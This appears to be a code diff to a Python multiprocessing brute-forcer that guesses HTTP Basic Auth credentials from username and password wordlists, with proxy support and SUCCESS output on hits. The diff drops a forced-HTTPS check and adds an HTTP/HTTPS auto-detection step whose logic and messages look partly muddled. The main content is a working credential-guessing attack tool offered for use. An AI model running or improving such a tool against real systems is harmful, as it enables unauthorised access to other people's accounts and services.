@@ -31,7 +31,6 @@ def safe_lines(filepath):
         sys.exit(1)
 
 
-
 def create_session(proxy=None):
     session = requests.Session()
     retries = Retry(
@@ -70,7 +69,7 @@ def try_login(domain, username, password, proxy, shared, lock):
         )
     except requests.RequestException as e:
         print(f"\n[!] ERROR: {username}:{password} → {e}")
-        return  # ← skip progress or shared flag update
+        return
 
     with lock:
         shared['count'] += 1
@@ -80,10 +79,9 @@ def try_login(domain, username, password, proxy, shared, lock):
             print(f"\n[✓] SUCCESS: {username}:{password}")
             shared['found'] = True
         elif response.status_code == 401:
-            pass  # silently fail
+            pass
         else:
             print(f"\n[?] UNKNOWN: {username}:{password} → Status: {response.status_code}")
-
 
 
 def brute_force(domain, usernames, passfile, proxy, workers):
@@ -111,22 +109,38 @@ def brute_force(domain, usernames, passfile, proxy, workers):
     print("\n[*] Brute-force finished.")
 
 
+def resolve_protocol(domain, username, password, proxy):
+    """Auto-switch to HTTPS if redirected, or fallback to HTTP on 401."""
+    http_domain = domain.replace("https://", "http://").replace("http://", "http://")
+    https_domain = domain.replace("http://", "https://")
+
+    session = create_session(proxy)
+
+    try:
+        response = session.get(http_domain, allow_redirects=True, auth=HTTPBasicAuth(username, password), timeout=5)
+        if response.url.startswith("https://"):
+            print(f"[+] Auto-redirect detected: using HTTPS")
+            return https_domain
+        elif response.status_code == 401:
+            print(f"[!] 401 Unauthorized on HTTPS, reverting to HTTP")
+            return http_domain
+        else:
+            return http_domain
+    except Exception as e:
+        print(f"[!] Error testing redirection: {e}")
+        return domain
+
+
 def main():
     parser = argparse.ArgumentParser(description="Multiprocessing Basic Auth Brute-Forcer with Progress Bar")
-    parser.add_argument("-d", "--domain", required=True, help="Target URL (must be HTTPS)")
+    parser.add_argument("-d", "--domain", required=True, help="Target URL (HTTP or HTTPS)")
     parser.add_argument("-U", "--userfile", help="Username wordlist file")
     parser.add_argument("-u", "--username", help="Single username")
     parser.add_argument("-P", "--passfile", required=True, help="Password wordlist file")
-    parser.add_argument("-x", "--proxy", help="Proxy (e.g. http://127.0.0.1:8080 or socks5://127.0.0.1:9050)")
+    parser.add_argument("-x", "--proxy", help="Proxy (e.g. http://127.0.0.1:8080)")
     parser.add_argument("-w", "--workers", type=int, default=cpu_count(), help="Number of processes to use")
 
     args = parser.parse_args()
-
-    # Force HTTPS
-    if not args.domain.lower().startswith("https://"):
-        print(f"[!] Target must use HTTPS. You entered: {args.domain}")
-        args.domain = "https://" + args.domain.lstrip("http://").lstrip("/")
-        print(f"[+] Auto-corrected to: {args.domain}")
 
     if not args.username and not args.userfile:
         print("[!] Provide either -u or -U")
@@ -138,7 +152,11 @@ def main():
         sys.exit(1)
 
     usernames = [args.username] if args.username else list(safe_lines(args.userfile))
-    brute_force(args.domain, usernames, args.passfile, args.proxy, args.workers)
+
+    # Use first username/password to determine protocol
+    domain = resolve_protocol(args.domain, usernames[0], next(safe_lines(args.passfile)), args.proxy)
+
+    brute_force(domain, usernames, args.passfile, args.proxy, args.workers)
 
 
 if __name__ == "__main__":
